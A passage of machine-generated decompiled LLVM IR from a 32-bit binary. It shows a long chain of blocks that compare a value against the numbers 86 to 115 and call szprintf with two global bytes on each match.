  %v2_804acbd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acbd, i32* @ebx, align 4
  %v5_804acc4 = call i32 @szprintf(i32 %v2_804acbd, i32 ptrtoint ([13 x i8]* @global_var_805757c.125 to i32), i32 %v1_804acae, i32 %v1_804aca2)
  br label %dec_label_pc_804accc

dec_label_pc_804accc:                             ; preds = %dec_label_pc_804ac9c, %dec_label_pc_804aca2
  %v12_804accc = icmp eq i32 %v11_8049ca7, 86
  %v1_804acd0 = icmp eq i1 %v12_804accc, false
  br i1 %v1_804acd0, label %dec_label_pc_804acfc, label %dec_label_pc_804acd2

dec_label_pc_804acd2:                             ; preds = %dec_label_pc_804accc
  %v0_804acd2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804acd2 = zext i8 %v0_804acd2 to i32
  store i32 %v1_804acd2, i32* @edx, align 4
  %v0_804acde = load i8, i8* @global_var_8061599.40, align 1
  %v1_804acde = zext i8 %v0_804acde to i32
  %v2_804aced = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aced, i32* @ebx, align 4
  %v5_804acf4 = call i32 @szprintf(i32 %v2_804aced, i32 ptrtoint ([13 x i8]* @global_var_8057589.126 to i32), i32 %v1_804acde, i32 %v1_804acd2)
  br label %dec_label_pc_804acfc

dec_label_pc_804acfc:                             ; preds = %dec_label_pc_804accc, %dec_label_pc_804acd2
  %v12_804acfc = icmp eq i32 %v11_8049ca7, 87
  %v1_804ad00 = icmp eq i1 %v12_804acfc, false
  br i1 %v1_804ad00, label %dec_label_pc_804ad2c, label %dec_label_pc_804ad02

dec_label_pc_804ad02:                             ; preds = %dec_label_pc_804acfc
  %v0_804ad02 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ad02 = zext i8 %v0_804ad02 to i32
  store i32 %v1_804ad02, i32* @edx, align 4
  %v0_804ad0e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ad0e = zext i8 %v0_804ad0e to i32
  %v2_804ad1d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad1d, i32* @ebx, align 4
  %v5_804ad24 = call i32 @szprintf(i32 %v2_804ad1d, i32 ptrtoint ([13 x i8]* @global_var_8057596.127 to i32), i32 %v1_804ad0e, i32 %v1_804ad02)
  br label %dec_label_pc_804ad2c

dec_label_pc_804ad2c:                             ; preds = %dec_label_pc_804acfc, %dec_label_pc_804ad02
  %v12_804ad2c = icmp eq i32 %v11_8049ca7, 88
  %v1_804ad30 = icmp eq i1 %v12_804ad2c, false
  br i1 %v1_804ad30, label %dec_label_pc_804ad5c, label %dec_label_pc_804ad32

dec_label_pc_804ad32:                             ; preds = %dec_label_pc_804ad2c
  %v0_804ad32 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ad32 = zext i8 %v0_804ad32 to i32
  store i32 %v1_804ad32, i32* @edx, align 4
  %v0_804ad3e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ad3e = zext i8 %v0_804ad3e to i32
  %v2_804ad4d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad4d, i32* @ebx, align 4
  %v5_804ad54 = call i32 @szprintf(i32 %v2_804ad4d, i32 ptrtoint ([13 x i8]* @global_var_80575a3.128 to i32), i32 %v1_804ad3e, i32 %v1_804ad32)
  br label %dec_label_pc_804ad5c

dec_label_pc_804ad5c:                             ; preds = %dec_label_pc_804ad2c, %dec_label_pc_804ad32
  %v12_804ad5c = icmp eq i32 %v11_8049ca7, 89
  %v1_804ad60 = icmp eq i1 %v12_804ad5c, false
  br i1 %v1_804ad60, label %dec_label_pc_804ad8c, label %dec_label_pc_804ad62

dec_label_pc_804ad62:                             ; preds = %dec_label_pc_804ad5c
  %v0_804ad62 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ad62 = zext i8 %v0_804ad62 to i32
  store i32 %v1_804ad62, i32* @edx, align 4
  %v0_804ad6e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ad6e = zext i8 %v0_804ad6e to i32
  %v2_804ad7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad7d, i32* @ebx, align 4
  %v5_804ad84 = call i32 @szprintf(i32 %v2_804ad7d, i32 ptrtoint ([13 x i8]* @global_var_80575b0.129 to i32), i32 %v1_804ad6e, i32 %v1_804ad62)
  br label %dec_label_pc_804ad8c

dec_label_pc_804ad8c:                             ; preds = %dec_label_pc_804ad5c, %dec_label_pc_804ad62
  %v12_804ad8c = icmp eq i32 %v11_8049ca7, 90
  %v1_804ad90 = icmp eq i1 %v12_804ad8c, false
  br i1 %v1_804ad90, label %dec_label_pc_804adbc, label %dec_label_pc_804ad92

dec_label_pc_804ad92:                             ; preds = %dec_label_pc_804ad8c
  %v0_804ad92 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ad92 = zext i8 %v0_804ad92 to i32
  store i32 %v1_804ad92, i32* @edx, align 4
  %v0_804ad9e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ad9e = zext i8 %v0_804ad9e to i32
  %v2_804adad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adad, i32* @ebx, align 4
  %v5_804adb4 = call i32 @szprintf(i32 %v2_804adad, i32 ptrtoint ([13 x i8]* @global_var_80575bd.130 to i32), i32 %v1_804ad9e, i32 %v1_804ad92)
  br label %dec_label_pc_804adbc

dec_label_pc_804adbc:                             ; preds = %dec_label_pc_804ad8c, %dec_label_pc_804ad92
  %v12_804adbc = icmp eq i32 %v11_8049ca7, 91
  %v1_804adc0 = icmp eq i1 %v12_804adbc, false
  br i1 %v1_804adc0, label %dec_label_pc_804adec, label %dec_label_pc_804adc2

dec_label_pc_804adc2:                             ; preds = %dec_label_pc_804adbc
  %v0_804adc2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804adc2 = zext i8 %v0_804adc2 to i32
  store i32 %v1_804adc2, i32* @edx, align 4
  %v0_804adce = load i8, i8* @global_var_8061599.40, align 1
  %v1_804adce = zext i8 %v0_804adce to i32
  %v2_804addd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804addd, i32* @ebx, align 4
  %v5_804ade4 = call i32 @szprintf(i32 %v2_804addd, i32 ptrtoint ([13 x i8]* @global_var_80575ca.131 to i32), i32 %v1_804adce, i32 %v1_804adc2)
  br label %dec_label_pc_804adec

dec_label_pc_804adec:                             ; preds = %dec_label_pc_804adbc, %dec_label_pc_804adc2
  %v12_804adec = icmp eq i32 %v11_8049ca7, 92
  %v1_804adf0 = icmp eq i1 %v12_804adec, false
  br i1 %v1_804adf0, label %dec_label_pc_804ae1c, label %dec_label_pc_804adf2

dec_label_pc_804adf2:                             ; preds = %dec_label_pc_804adec
  %v0_804adf2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804adf2 = zext i8 %v0_804adf2 to i32
  store i32 %v1_804adf2, i32* @edx, align 4
  %v0_804adfe = load i8, i8* @global_var_8061599.40, align 1
  %v1_804adfe = zext i8 %v0_804adfe to i32
  %v2_804ae0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae0d, i32* @ebx, align 4
  %v5_804ae14 = call i32 @szprintf(i32 %v2_804ae0d, i32 ptrtoint ([13 x i8]* @global_var_80575d7.132 to i32), i32 %v1_804adfe, i32 %v1_804adf2)
  br label %dec_label_pc_804ae1c

dec_label_pc_804ae1c:                             ; preds = %dec_label_pc_804adec, %dec_label_pc_804adf2
  %v12_804ae1c = icmp eq i32 %v11_8049ca7, 93
  %v1_804ae20 = icmp eq i1 %v12_804ae1c, false
  br i1 %v1_804ae20, label %dec_label_pc_804ae4c, label %dec_label_pc_804ae22

dec_label_pc_804ae22:                             ; preds = %dec_label_pc_804ae1c
  %v0_804ae22 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ae22 = zext i8 %v0_804ae22 to i32
  store i32 %v1_804ae22, i32* @edx, align 4
  %v0_804ae2e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ae2e = zext i8 %v0_804ae2e to i32
  %v2_804ae3d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae3d, i32* @ebx, align 4
  %v5_804ae44 = call i32 @szprintf(i32 %v2_804ae3d, i32 ptrtoint ([13 x i8]* @global_var_8057163.42 to i32), i32 %v1_804ae2e, i32 %v1_804ae22)
  br label %dec_label_pc_804ae4c

dec_label_pc_804ae4c:                             ; preds = %dec_label_pc_804ae1c, %dec_label_pc_804ae22
  %v12_804ae4c = icmp eq i32 %v11_8049ca7, 94
  %v1_804ae50 = icmp eq i1 %v12_804ae4c, false
  br i1 %v1_804ae50, label %dec_label_pc_804ae7c, label %dec_label_pc_804ae52

dec_label_pc_804ae52:                             ; preds = %dec_label_pc_804ae4c
  %v0_804ae52 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ae52 = zext i8 %v0_804ae52 to i32
  store i32 %v1_804ae52, i32* @edx, align 4
  %v0_804ae5e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ae5e = zext i8 %v0_804ae5e to i32
  %v2_804ae6d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae6d, i32* @ebx, align 4
  %v5_804ae74 = call i32 @szprintf(i32 %v2_804ae6d, i32 ptrtoint ([13 x i8]* @global_var_80575e4.133 to i32), i32 %v1_804ae5e, i32 %v1_804ae52)
  br label %dec_label_pc_804ae7c

dec_label_pc_804ae7c:                             ; preds = %dec_label_pc_804ae4c, %dec_label_pc_804ae52
  %v12_804ae7c = icmp eq i32 %v11_8049ca7, 95
  %v1_804ae80 = icmp eq i1 %v12_804ae7c, false
  br i1 %v1_804ae80, label %dec_label_pc_804aeac, label %dec_label_pc_804ae82

dec_label_pc_804ae82:                             ; preds = %dec_label_pc_804ae7c
  %v0_804ae82 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804ae82 = zext i8 %v0_804ae82 to i32
  store i32 %v1_804ae82, i32* @edx, align 4
  %v0_804ae8e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804ae8e = zext i8 %v0_804ae8e to i32
  %v2_804ae9d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae9d, i32* @ebx, align 4
  %v5_804aea4 = call i32 @szprintf(i32 %v2_804ae9d, i32 ptrtoint ([13 x i8]* @global_var_80575f1.134 to i32), i32 %v1_804ae8e, i32 %v1_804ae82)
  br label %dec_label_pc_804aeac

dec_label_pc_804aeac:                             ; preds = %dec_label_pc_804ae7c, %dec_label_pc_804ae82
  %v9_804aeac = icmp eq i32 %v11_8049ca7, 96
  %v1_804aeb0 = icmp eq i1 %v9_804aeac, false
  br i1 %v1_804aeb0, label %dec_label_pc_804aedc, label %dec_label_pc_804aeb2

dec_label_pc_804aeb2:                             ; preds = %dec_label_pc_804aeac
  %v0_804aeb2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804aeb2 = zext i8 %v0_804aeb2 to i32
  store i32 %v1_804aeb2, i32* @edx, align 4
  %v0_804aebe = load i8, i8* @global_var_8061599.40, align 1
  %v1_804aebe = zext i8 %v0_804aebe to i32
  %v2_804aecd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aecd, i32* @ebx, align 4
  %v5_804aed4 = call i32 @szprintf(i32 %v2_804aecd, i32 ptrtoint ([13 x i8]* @global_var_80575fe.135 to i32), i32 %v1_804aebe, i32 %v1_804aeb2)
  br label %dec_label_pc_804aedc

dec_label_pc_804aedc:                             ; preds = %dec_label_pc_804aeac, %dec_label_pc_804aeb2
  %v12_804aedc = icmp eq i32 %v11_8049ca7, 97
  %v1_804aee0 = icmp eq i1 %v12_804aedc, false
  br i1 %v1_804aee0, label %dec_label_pc_804af0c, label %dec_label_pc_804aee2

dec_label_pc_804aee2:                             ; preds = %dec_label_pc_804aedc
  %v0_804aee2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804aee2 = zext i8 %v0_804aee2 to i32
  store i32 %v1_804aee2, i32* @edx, align 4
  %v0_804aeee = load i8, i8* @global_var_8061599.40, align 1
  %v1_804aeee = zext i8 %v0_804aeee to i32
  %v2_804aefd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aefd, i32* @ebx, align 4
  %v5_804af04 = call i32 @szprintf(i32 %v2_804aefd, i32 ptrtoint ([13 x i8]* @global_var_805760b.136 to i32), i32 %v1_804aeee, i32 %v1_804aee2)
  br label %dec_label_pc_804af0c

dec_label_pc_804af0c:                             ; preds = %dec_label_pc_804aedc, %dec_label_pc_804aee2
  %v12_804af0c = icmp eq i32 %v11_8049ca7, 98
  %v1_804af10 = icmp eq i1 %v12_804af0c, false
  br i1 %v1_804af10, label %dec_label_pc_804af3c, label %dec_label_pc_804af12

dec_label_pc_804af12:                             ; preds = %dec_label_pc_804af0c
  %v0_804af12 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804af12 = zext i8 %v0_804af12 to i32
  store i32 %v1_804af12, i32* @edx, align 4
  %v0_804af1e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804af1e = zext i8 %v0_804af1e to i32
  %v2_804af2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af2d, i32* @ebx, align 4
  %v5_804af34 = call i32 @szprintf(i32 %v2_804af2d, i32 ptrtoint ([13 x i8]* @global_var_8057618.137 to i32), i32 %v1_804af1e, i32 %v1_804af12)
  br label %dec_label_pc_804af3c

dec_label_pc_804af3c:                             ; preds = %dec_label_pc_804af0c, %dec_label_pc_804af12
  %v12_804af3c = icmp eq i32 %v11_8049ca7, 99
  %v1_804af40 = icmp eq i1 %v12_804af3c, false
  br i1 %v1_804af40, label %dec_label_pc_804af6c, label %dec_label_pc_804af42

dec_label_pc_804af42:                             ; preds = %dec_label_pc_804af3c
  %v0_804af42 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804af42 = zext i8 %v0_804af42 to i32
  store i32 %v1_804af42, i32* @edx, align 4
  %v0_804af4e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804af4e = zext i8 %v0_804af4e to i32
  %v2_804af5d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af5d, i32* @ebx, align 4
  %v5_804af64 = call i32 @szprintf(i32 %v2_804af5d, i32 ptrtoint ([13 x i8]* @global_var_8057625.138 to i32), i32 %v1_804af4e, i32 %v1_804af42)
  br label %dec_label_pc_804af6c

dec_label_pc_804af6c:                             ; preds = %dec_label_pc_804af3c, %dec_label_pc_804af42
  %v12_804af6c = icmp eq i32 %v11_8049ca7, 100
  %v1_804af70 = icmp eq i1 %v12_804af6c, false
  br i1 %v1_804af70, label %dec_label_pc_804af9c, label %dec_label_pc_804af72

dec_label_pc_804af72:                             ; preds = %dec_label_pc_804af6c
  %v0_804af72 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804af72 = zext i8 %v0_804af72 to i32
  store i32 %v1_804af72, i32* @edx, align 4
  %v0_804af7e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804af7e = zext i8 %v0_804af7e to i32
  %v2_804af8d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af8d, i32* @ebx, align 4
  %v5_804af94 = call i32 @szprintf(i32 %v2_804af8d, i32 ptrtoint ([13 x i8]* @global_var_8057632.139 to i32), i32 %v1_804af7e, i32 %v1_804af72)
  br label %dec_label_pc_804af9c

dec_label_pc_804af9c:                             ; preds = %dec_label_pc_804af6c, %dec_label_pc_804af72
  %v12_804af9c = icmp eq i32 %v11_8049ca7, 101
  %v1_804afa0 = icmp eq i1 %v12_804af9c, false
  br i1 %v1_804afa0, label %dec_label_pc_804afcc, label %dec_label_pc_804afa2

dec_label_pc_804afa2:                             ; preds = %dec_label_pc_804af9c
  %v0_804afa2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804afa2 = zext i8 %v0_804afa2 to i32
  store i32 %v1_804afa2, i32* @edx, align 4
  %v0_804afae = load i8, i8* @global_var_8061599.40, align 1
  %v1_804afae = zext i8 %v0_804afae to i32
  %v2_804afbd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afbd, i32* @ebx, align 4
  %v5_804afc4 = call i32 @szprintf(i32 %v2_804afbd, i32 ptrtoint ([13 x i8]* @global_var_805763f.140 to i32), i32 %v1_804afae, i32 %v1_804afa2)
  br label %dec_label_pc_804afcc

dec_label_pc_804afcc:                             ; preds = %dec_label_pc_804af9c, %dec_label_pc_804afa2
  %v12_804afcc = icmp eq i32 %v11_8049ca7, 102
  %v1_804afd0 = icmp eq i1 %v12_804afcc, false
  br i1 %v1_804afd0, label %dec_label_pc_804affc, label %dec_label_pc_804afd2

dec_label_pc_804afd2:                             ; preds = %dec_label_pc_804afcc
  %v0_804afd2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804afd2 = zext i8 %v0_804afd2 to i32
  store i32 %v1_804afd2, i32* @edx, align 4
  %v0_804afde = load i8, i8* @global_var_8061599.40, align 1
  %v1_804afde = zext i8 %v0_804afde to i32
  %v2_804afed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afed, i32* @ebx, align 4
  %v5_804aff4 = call i32 @szprintf(i32 %v2_804afed, i32 ptrtoint ([12 x i8]* @global_var_805764c.141 to i32), i32 %v1_804afde, i32 %v1_804afd2)
  br label %dec_label_pc_804affc

dec_label_pc_804affc:                             ; preds = %dec_label_pc_804afcc, %dec_label_pc_804afd2
  %v12_804affc = icmp eq i32 %v11_8049ca7, 103
  %v1_804b000 = icmp eq i1 %v12_804affc, false
  br i1 %v1_804b000, label %dec_label_pc_804b02c, label %dec_label_pc_804b002

dec_label_pc_804b002:                             ; preds = %dec_label_pc_804affc
  %v0_804b002 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b002 = zext i8 %v0_804b002 to i32
  store i32 %v1_804b002, i32* @edx, align 4
  %v0_804b00e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b00e = zext i8 %v0_804b00e to i32
  %v2_804b01d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b01d, i32* @ebx, align 4
  %v5_804b024 = call i32 @szprintf(i32 %v2_804b01d, i32 ptrtoint ([13 x i8]* @global_var_8057658.142 to i32), i32 %v1_804b00e, i32 %v1_804b002)
  br label %dec_label_pc_804b02c

dec_label_pc_804b02c:                             ; preds = %dec_label_pc_804affc, %dec_label_pc_804b002
  %v12_804b02c = icmp eq i32 %v11_8049ca7, 104
  %v1_804b030 = icmp eq i1 %v12_804b02c, false
  br i1 %v1_804b030, label %dec_label_pc_804b05c, label %dec_label_pc_804b032

dec_label_pc_804b032:                             ; preds = %dec_label_pc_804b02c
  %v0_804b032 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b032 = zext i8 %v0_804b032 to i32
  store i32 %v1_804b032, i32* @edx, align 4
  %v0_804b03e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b03e = zext i8 %v0_804b03e to i32
  %v2_804b04d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b04d, i32* @ebx, align 4
  %v5_804b054 = call i32 @szprintf(i32 %v2_804b04d, i32 ptrtoint ([13 x i8]* @global_var_8057665.143 to i32), i32 %v1_804b03e, i32 %v1_804b032)
  br label %dec_label_pc_804b05c

dec_label_pc_804b05c:                             ; preds = %dec_label_pc_804b02c, %dec_label_pc_804b032
  %v12_804b05c = icmp eq i32 %v11_8049ca7, 105
  %v1_804b060 = icmp eq i1 %v12_804b05c, false
  br i1 %v1_804b060, label %dec_label_pc_804b08c, label %dec_label_pc_804b062

dec_label_pc_804b062:                             ; preds = %dec_label_pc_804b05c
  %v0_804b062 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b062 = zext i8 %v0_804b062 to i32
  store i32 %v1_804b062, i32* @edx, align 4
  %v0_804b06e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b06e = zext i8 %v0_804b06e to i32
  %v2_804b07d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b07d, i32* @ebx, align 4
  %v5_804b084 = call i32 @szprintf(i32 %v2_804b07d, i32 ptrtoint ([13 x i8]* @global_var_8057672.144 to i32), i32 %v1_804b06e, i32 %v1_804b062)
  br label %dec_label_pc_804b08c

dec_label_pc_804b08c:                             ; preds = %dec_label_pc_804b05c, %dec_label_pc_804b062
  %v12_804b08c = icmp eq i32 %v11_8049ca7, 106
  %v1_804b090 = icmp eq i1 %v12_804b08c, false
  br i1 %v1_804b090, label %dec_label_pc_804b0bc, label %dec_label_pc_804b092

dec_label_pc_804b092:                             ; preds = %dec_label_pc_804b08c
  %v0_804b092 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b092 = zext i8 %v0_804b092 to i32
  store i32 %v1_804b092, i32* @edx, align 4
  %v0_804b09e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b09e = zext i8 %v0_804b09e to i32
  %v2_804b0ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0ad, i32* @ebx, align 4
  %v5_804b0b4 = call i32 @szprintf(i32 %v2_804b0ad, i32 ptrtoint ([12 x i8]* @global_var_805767f.145 to i32), i32 %v1_804b09e, i32 %v1_804b092)
  br label %dec_label_pc_804b0bc

dec_label_pc_804b0bc:                             ; preds = %dec_label_pc_804b08c, %dec_label_pc_804b092
  %v12_804b0bc = icmp eq i32 %v11_8049ca7, 107
  %v1_804b0c0 = icmp eq i1 %v12_804b0bc, false
  br i1 %v1_804b0c0, label %dec_label_pc_804b0ec, label %dec_label_pc_804b0c2

dec_label_pc_804b0c2:                             ; preds = %dec_label_pc_804b0bc
  %v0_804b0c2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b0c2 = zext i8 %v0_804b0c2 to i32
  store i32 %v1_804b0c2, i32* @edx, align 4
  %v0_804b0ce = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b0ce = zext i8 %v0_804b0ce to i32
  %v2_804b0dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0dd, i32* @ebx, align 4
  %v5_804b0e4 = call i32 @szprintf(i32 %v2_804b0dd, i32 ptrtoint ([13 x i8]* @global_var_805768b.146 to i32), i32 %v1_804b0ce, i32 %v1_804b0c2)
  br label %dec_label_pc_804b0ec

dec_label_pc_804b0ec:                             ; preds = %dec_label_pc_804b0bc, %dec_label_pc_804b0c2
  %v12_804b0ec = icmp eq i32 %v11_8049ca7, 108
  %v1_804b0f0 = icmp eq i1 %v12_804b0ec, false
  br i1 %v1_804b0f0, label %dec_label_pc_804b11c, label %dec_label_pc_804b0f2

dec_label_pc_804b0f2:                             ; preds = %dec_label_pc_804b0ec
  %v0_804b0f2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b0f2 = zext i8 %v0_804b0f2 to i32
  store i32 %v1_804b0f2, i32* @edx, align 4
  %v0_804b0fe = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b0fe = zext i8 %v0_804b0fe to i32
  %v2_804b10d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b10d, i32* @ebx, align 4
  %v5_804b114 = call i32 @szprintf(i32 %v2_804b10d, i32 ptrtoint ([14 x i8]* @global_var_8057698.147 to i32), i32 %v1_804b0fe, i32 %v1_804b0f2)
  br label %dec_label_pc_804b11c

dec_label_pc_804b11c:                             ; preds = %dec_label_pc_804b0ec, %dec_label_pc_804b0f2
  %v12_804b11c = icmp eq i32 %v11_8049ca7, 109
  %v1_804b120 = icmp eq i1 %v12_804b11c, false
  br i1 %v1_804b120, label %dec_label_pc_804b14c, label %dec_label_pc_804b122

dec_label_pc_804b122:                             ; preds = %dec_label_pc_804b11c
  %v0_804b122 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b122 = zext i8 %v0_804b122 to i32
  store i32 %v1_804b122, i32* @edx, align 4
  %v0_804b12e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b12e = zext i8 %v0_804b12e to i32
  %v2_804b13d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b13d, i32* @ebx, align 4
  %v5_804b144 = call i32 @szprintf(i32 %v2_804b13d, i32 ptrtoint ([14 x i8]* @global_var_80576a6.148 to i32), i32 %v1_804b12e, i32 %v1_804b122)
  br label %dec_label_pc_804b14c

dec_label_pc_804b14c:                             ; preds = %dec_label_pc_804b11c, %dec_label_pc_804b122
  %v12_804b14c = icmp eq i32 %v11_8049ca7, 110
  %v1_804b150 = icmp eq i1 %v12_804b14c, false
  br i1 %v1_804b150, label %dec_label_pc_804b17c, label %dec_label_pc_804b152

dec_label_pc_804b152:                             ; preds = %dec_label_pc_804b14c
  %v0_804b152 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b152 = zext i8 %v0_804b152 to i32
  store i32 %v1_804b152, i32* @edx, align 4
  %v0_804b15e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b15e = zext i8 %v0_804b15e to i32
  %v2_804b16d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b16d, i32* @ebx, align 4
  %v5_804b174 = call i32 @szprintf(i32 %v2_804b16d, i32 ptrtoint ([13 x i8]* @global_var_80576b4.149 to i32), i32 %v1_804b15e, i32 %v1_804b152)
  br label %dec_label_pc_804b17c

dec_label_pc_804b17c:                             ; preds = %dec_label_pc_804b14c, %dec_label_pc_804b152
  %v12_804b17c = icmp eq i32 %v11_8049ca7, 111
  %v1_804b180 = icmp eq i1 %v12_804b17c, false
  br i1 %v1_804b180, label %dec_label_pc_804b1ac, label %dec_label_pc_804b182

dec_label_pc_804b182:                             ; preds = %dec_label_pc_804b17c
  %v0_804b182 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b182 = zext i8 %v0_804b182 to i32
  store i32 %v1_804b182, i32* @edx, align 4
  %v0_804b18e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b18e = zext i8 %v0_804b18e to i32
  %v2_804b19d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b19d, i32* @ebx, align 4
  %v5_804b1a4 = call i32 @szprintf(i32 %v2_804b19d, i32 ptrtoint ([14 x i8]* @global_var_80576c1.150 to i32), i32 %v1_804b18e, i32 %v1_804b182)
  br label %dec_label_pc_804b1ac

dec_label_pc_804b1ac:                             ; preds = %dec_label_pc_804b17c, %dec_label_pc_804b182
  %v9_804b1ac = icmp eq i32 %v11_8049ca7, 112
  %v1_804b1b0 = icmp eq i1 %v9_804b1ac, false
  br i1 %v1_804b1b0, label %dec_label_pc_804b1dc, label %dec_label_pc_804b1b2

dec_label_pc_804b1b2:                             ; preds = %dec_label_pc_804b1ac
  %v0_804b1b2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b1b2 = zext i8 %v0_804b1b2 to i32
  store i32 %v1_804b1b2, i32* @edx, align 4
  %v0_804b1be = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b1be = zext i8 %v0_804b1be to i32
  %v2_804b1cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1cd, i32* @ebx, align 4
  %v5_804b1d4 = call i32 @szprintf(i32 %v2_804b1cd, i32 ptrtoint ([14 x i8]* @global_var_80576cf.151 to i32), i32 %v1_804b1be, i32 %v1_804b1b2)
  br label %dec_label_pc_804b1dc

dec_label_pc_804b1dc:                             ; preds = %dec_label_pc_804b1ac, %dec_label_pc_804b1b2
  %v12_804b1dc = icmp eq i32 %v11_8049ca7, 113
  %v1_804b1e0 = icmp eq i1 %v12_804b1dc, false
  br i1 %v1_804b1e0, label %dec_label_pc_804b20c, label %dec_label_pc_804b1e2

dec_label_pc_804b1e2:                             ; preds = %dec_label_pc_804b1dc
  %v0_804b1e2 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b1e2 = zext i8 %v0_804b1e2 to i32
  store i32 %v1_804b1e2, i32* @edx, align 4
  %v0_804b1ee = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b1ee = zext i8 %v0_804b1ee to i32
  %v2_804b1fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1fd, i32* @ebx, align 4
  %v5_804b204 = call i32 @szprintf(i32 %v2_804b1fd, i32 ptrtoint ([13 x i8]* @global_var_80576dd.152 to i32), i32 %v1_804b1ee, i32 %v1_804b1e2)
  br label %dec_label_pc_804b20c

dec_label_pc_804b20c:                             ; preds = %dec_label_pc_804b1dc, %dec_label_pc_804b1e2
  %v12_804b20c = icmp eq i32 %v11_8049ca7, 114
  %v1_804b210 = icmp eq i1 %v12_804b20c, false
  br i1 %v1_804b210, label %dec_label_pc_804b23c, label %dec_label_pc_804b212

dec_label_pc_804b212:                             ; preds = %dec_label_pc_804b20c
  %v0_804b212 = load i8, i8* @global_var_806159a.41, align 2
  %v1_804b212 = zext i8 %v0_804b212 to i32
  store i32 %v1_804b212, i32* @edx, align 4
  %v0_804b21e = load i8, i8* @global_var_8061599.40, align 1
  %v1_804b21e = zext i8 %v0_804b21e to i32
  %v2_804b22d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b22d, i32* @ebx, align 4
  %v5_804b234 = call i32 @szprintf(i32 %v2_804b22d, i32 ptrtoint ([14 x i8]* @global_var_80576ea.153 to i32), i32 %v1_804b21e, i32 %v1_804b212)
  br label %dec_label_pc_804b23c

dec_label_pc_804b23c:                             ; preds = %dec_label_pc_804b20c, %dec_label_pc_804b212
  %v12_804b23c = icmp eq i32 %v11_8049ca7, 115
  %v1_804b240 = icmp eq i1 %v12_804b23c, false
  br i1 %v1_804b240, label %dec_label_pc_804b23c.dec_label_pc_804b26c_crit_edge, label %dec_label_pc_804b242

dec_label_pc_804b23c.dec_label_pc_804b26c_crit_edge: ; preds = %dec_label_pc_804b23c
  %.pre101 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804b26c

dec_label_pc_804b242:                             ; preds = %dec_label_pc_804b23c
